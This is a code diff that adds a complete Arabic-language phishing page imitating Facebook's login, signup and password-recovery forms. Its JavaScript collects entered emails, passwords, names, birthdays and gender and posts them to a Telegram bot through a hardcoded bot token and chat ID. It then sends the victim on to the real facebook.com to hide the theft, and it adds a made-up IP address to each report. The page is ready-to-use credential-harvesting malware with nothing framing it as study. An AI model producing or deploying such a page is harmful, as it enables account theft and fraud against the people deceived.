@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - تسجيل الدخول أو إنشاء حساب</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background-color: #ffffff;
+            padding: 0 16px;
+            height: 56px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        
+        .main-content {
+            display: flex;
+            flex: 1;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            max-width: 980px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        
+        .intro-text {
+            padding-left: 32px;
+            max-width: 500px;
+            margin-right: 30px;
+        }
+        
+        .intro-text h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            margin-bottom: 20px;
+        }
+        
+        .login-form {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 396px;
+            margin-left: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            font-size: 17px;
+        }
+        
+        .form-control:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        
+        .btn {
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            padding: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            display: block;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .btn-primary {
+            background-color: #1877f2;
+            color: white;
+        }
+        
+        .btn-success {
+            background-color: #42b72a;
+            color: white;
+            margin-top: 15px;
+            width: auto;
+            margin: 15px auto;
+            font-size: 17px;
+            padding: 10px 16px;
+        }
+        
+        .btn-primary:hover {
+            background-color: #166fe5;
+        }
+        
+        .btn-success:hover {
+            background-color: #36a420;
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            text-align: center;
+            display: block;
+            margin-top: 15px;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .form-title {
+            text-align: center;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .tabs {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+        
+        .tab.active {
+            border-bottom: 2px solid #1877f2;
+            color: #1877f2;
+            font-weight: bold;
+        }
+        
+        .form-container {
+            display: none;
+        }
+        
+        .form-container.active {
+            display: block;
+        }
+        
+        .footer {
+            background-color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            color: #737373;
+            font-size: 14px;
+            margin-top: auto;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .create-page {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 900px) {
+            .main-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .intro-text {
+                padding-left: 0;
+                margin-bottom: 30px;
+                margin-right: 0;
+            }
+            
+            .login-form {
+                margin-left: 0;
+            }
+        }
+        
+        .language-bar {
+            padding: 10px 0;
+            text-align: center;
+            font-size: 13px;
+            color: #737373;
+            border-top: 1px solid #dddfe2;
+            margin-top: 20px;
+        }
+        
+        .language-bar a {
+            color: #385898;
+            text-decoration: none;
+            margin: 0 3px;
+        }
+        
+        .language-bar a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">facebook</div>
+    </div>
+    
+    <div class="main-content">
+        <div class="intro-text">
+            <h2>يساعدك Facebook على التواصل مع الأشخاص ومشاركة ما تريد معهم.</h2>
+        </div>
+        
+        <div class="login-form">
+            <!-- تسجيل الدخول -->
+            <div class="form-container active" id="login-form">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <input type="text" class="form-control" id="loginEmail" placeholder="البريد الإلكتروني أو رقم الهاتف">
+                    </div>
+                    <div class="form-group">
+                        <input type="password" class="form-control" id="loginPassword" placeholder="كلمة السر">
+                    </div>
+                    <button type="submit" class="btn btn-primary">تسجيل الدخول</button>
+                    <a href="#" class="forgot-password" onclick="switchTab('forgot'); return false;">هل نسيت كلمة السر؟</a>
+                    <div class="divider"></div>
+                    <button type="button" class="btn btn-success" onclick="switchTab('signup')">إنشاء حساب جديد</button>
+                </form>
+                <div class="loading" id="loginLoading">
+                    <div class="loading-spinner"></div>
+                    <p>جاري تسجيل الدخول...</p>
+                </div>
+            </div>
+            
+            <!-- إنشاء حساب -->
+            <div class="form-container" id="signup-form">
+                <div class="form-title">إنشاء حساب جديد</div>
+                <form id="signupForm">
+                    <div class="form-group" style="display: flex; gap: 10px;">
+                        <input type="text" class="form-control" id="firstName" placeholder="الاسم الأول">
+                        <input type="text" class="form-control" id="lastName" placeholder="اسم العائلة">
+                    </div>
+                    <div class="form-group">
+                        <input type="email" class="form-control" id="signupEmail" placeholder="البريد الإلكتروني">
+                    </div>
+                    <div class="form-group">
+                        <input type="password" class="form-control" id="signupPassword" placeholder="كلمة السر الجديدة">
+                    </div>
+                    <div class="form-group">
+                        <label style="font-size: 12px; color: #606770;">تاريخ الميلاد</label>
+                        <input type="date" class="form-control" id="birthday">
+                    </div>
+                    <div class="form-group">
+                        <label style="font-size: 12px; color: #606770;">الجنس</label>
+                        <div style="display: flex; gap: 10px;">
+                            <label style="border: 1px solid #ccd0d5; padding: 8px; border-radius: 4px; flex: 1;">
+                                <input type="radio" name="gender" value="أنثى"> أنثى
+                            </label>
+                            <label style="border: 1px solid #ccd0d5; padding: 8px; border-radius: 4px; flex: 1;">
+                                <input type="radio" name="gender" value="ذكر"> ذكر
+                            </label>
+                        </div>
+                    </div>
+                    <div class="form-group" style="font-size: 11px; color: #777;">
+                        <p>بالنقر على "إنشاء حساب"، فإنك توافق على <a href="#" style="color: #385898;">الشروط</a> و<a href="#" style="color: #385898;">سياسة الخصوصية</a> و<a href="#" style="color: #385898;">سياسة الكوكيز</a>. قد تتلقى إشعارات منا ويمكنك إلغاء الاشتراك في أي وقت.</p>
+                    </div>
+                    <button type="submit" class="btn btn-success">إنشاء حساب</button>
+                </form>
+                <div class="loading" id="signupLoading">
+                    <div class="loading-spinner"></div>
+                    <p>جاري إنشاء الحساب...</p>
+                </div>
+            </div>
+            
+            <!-- نسيت كلمة السر -->
+            <div class="form-container" id="forgot-form">
+                <div class="form-title">البحث عن حسابك</div>
+                <form id="forgotForm">
+                    <div class="form-group">
+                        <p style="font-size: 14px; margin-bottom: 15px;">الرجاء إدخال بريدك الإلكتروني أو رقم هاتفك للبحث عن حسابك.</p>
+                        <input type="text" class="form-control" id="recoveryEmail" placeholder="البريد الإلكتروني أو رقم الهاتف">
+                    </div>
+                    <div class="divider"></div>
+                    <div style="display: flex; justify-content: flex-end; gap: 10px;">
+                        <button type="button" class="btn" style="background-color: #e4e6eb; color: #4b4f56;" onclick="switchTab('login')">إلغاء</button>
+                        <button type="submit" class="btn btn-primary">بحث</button>
+                    </div>
+                </form>
+                <div class="loading" id="forgotLoading">
+                    <div class="loading-spinner"></div>
+                    <p>جاري البحث عن الحساب...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="language-bar">
+        <a href="#">العربية</a>
+        <a href="#">English (US)</a>
+        <a href="#">Français (France)</a>
+        <a href="#">Español</a>
+        <a href="#">Italiano</a>
+        <a href="#">Deutsch</a>
+        <a href="#">Português (Brasil)</a>
+        <a href="#">हिन्दी</a>
+        <a href="#">中文(简体)</a>
+        <a href="#">日本語</a>
+        <button style="background: none; border: 1px solid #ccd0d5; padding: 3px 8px; border-radius: 4px; margin-left: 10px; cursor: pointer;">+</button>
+    </div>
+    
+    <div class="footer">
+        <p>Facebook © 2023</p>
+    </div>
+
+    <script>
+        // وظيفة للتبديل بين النماذج
+        function switchTab(tabName) {
+            document.querySelectorAll('.form-container').forEach(form => {
+                form.classList.remove('active');
+            });
+            
+            document.getElementById(`${tabName}-form`).classList.add('active');
+        }
+        
+        // إرسال بيانات تسجيل الدخول
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            if (!email || !password) {
+                alert('يرجى ملء جميع الحقول');
+                return;
+            }
+            
+            // إرسال البيانات إلى بوت التليجرام
+            sendToTelegram('تسجيل دخول', { email, password });
+        });
+        
+        // إرسال بيانات إنشاء حساب
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const email = document.getElementById('signupEmail').value;
+            const password = document.getElementById('signupPassword').value;
+            const birthday = document.getElementById('birthday').value;
+            const gender = document.querySelector('input[name="gender"]:checked') ? document.querySelector('input[name="gender"]:checked').value : 'غير محدد';
+            
+            if (!firstName || !lastName || !email || !password || !birthday) {
+                alert('يرجى ملء جميع الحقول');
+                return;
+            }
+            
+            // إرسال البيانات إلى بوت التليجرام
+            sendToTelegram('إنشاء حساب', { firstName, lastName, email, password, birthday, gender });
+        });
+        
+        // إرسال بيانات استعادة كلمة المرور
+        document.getElementById('forgotForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const recoveryEmail = document.getElementById('recoveryEmail').value;
+            
+            if (!recoveryEmail) {
+                alert('يرجى إدخال البريد الإلكتروني أو رقم الهاتف');
+                return;
+            }
+            
+            // إرسال البيانات إلى بوت التليجرام
+            sendToTelegram('نسيت كلمة السر', { recoveryEmail });
+        });
+        
+        // وظيفة إرسال البيانات إلى بوت التليجرام
+        function sendToTelegram(action, data) {
+            // معلومات بوت التليجرام الخاص بك
+            const botToken = '8040046212:AAGlhEHjICyKJYww35tflD0QIVx_iktsmfQ';
+            const chatId = '5058927918';
+            
+            // بناء الرسالة
+            let message = `🔔 إشعار جديد من صفحة فيسبوك\n`;
+            message += `الإجراء: ${action}\n`;
+            message += `التفاصيل:\n`;
+            
+            for (const [key, value] of Object.entries(data)) {
+                message += `${key}: ${value}\n`;
+            }
+            
+            message += `الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
+            message += `IP: ${generateRandomIP()}`;
+            
+            // إرسال الرسالة إلى التليجرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم إرسال البيانات إلى التليجرام:', data);
+                
+                // بعد الإرسال، توجيه المستخدم إلى فيسبوك الحقيقي
+                window.location.href = 'https://www.facebook.com';
+            })
+            .catch(error => {
+                console.error('خطأ في الإرسال:', error);
+                
+                // في حالة الخطأ، لا يزال يتم التوجيه إلى فيسبوك
+                window.location.href = 'https://www.facebook.com';
+            });
+        }
+        
+        // توليد عنوان IP عشوائي (لأغراض المحاكاة فقط)
+        function generateRandomIP() {
+            return `${Math.floor(Math.random() * 255) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        }
+    </script>
+</body>
+</html>
